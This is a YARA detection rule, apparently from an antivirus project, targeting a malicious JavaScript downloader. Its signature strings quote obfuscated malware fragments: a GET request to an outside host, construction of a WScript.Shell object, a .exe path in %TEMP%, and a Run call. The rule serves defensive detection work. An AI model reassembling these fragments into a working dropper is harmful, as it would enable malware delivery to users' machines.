rule sig_20160330_7eeddf6df93bce03806d6c1789501805 {
  meta:
    description = "datamaliciousorder - file 20160330_7eeddf6df93bce03806d6c1789501805.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9ac1c29826cbf4429bf9ca1d6c1e791e1b97a50a9a7e0c7d6d1c29b83b56435a"

  strings:
    $s1  = "_Z[_YU](\"GET\", \"http://rocketsrange.com/b5ksa\", false);" fullword ascii
    $s2  = "function _J(_G, _A){_NA = _NA * 1; return _G - _A;};" fullword ascii
    $s3  = "var _I0 = function _I() {return WScript[_H](\"WScript\"+\".Shell\");}(), _MP = 11;" fullword ascii
    $s4  = "if (_Z[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _D() {return _I0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"jsHTx6XacBS.ex\" + \"e\";};" fullword ascii
    $s6  = "function _UF(){return _FL + \"\";};" fullword ascii
    $s7  = "function _HQ(_U){_I0[\"Run\"](_U, _NA, _NA);};" fullword ascii
    $s8  = "function _XR() {return ((_X == true) && (_X == _R)) ? 1 : _NA;};" fullword ascii
    $s9  = "var _JB = new this[\"Date\"]();" fullword ascii
    $s10 = "function _PP(){return 22;};" fullword ascii
    $s11 = "function _T()" fullword ascii
    $s12 = "return _J(_MM, _H0);" fullword ascii
    $s13 = "function _CW(_DJ) {var _N = (1, 2, 3, 4, 5, _DJ); return _N;};" fullword ascii
    $s14 = "function _WO(){return _H;};" fullword ascii
    $s15 = " while (_KA){" fullword ascii
    $s16 = "var _R = false;" fullword ascii
    $s17 = "var _X = false;" fullword ascii
    $s18 = "_X = true; " fullword ascii
    $s19 = "_R = true; " fullword ascii
    $s20 = "var _OR = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}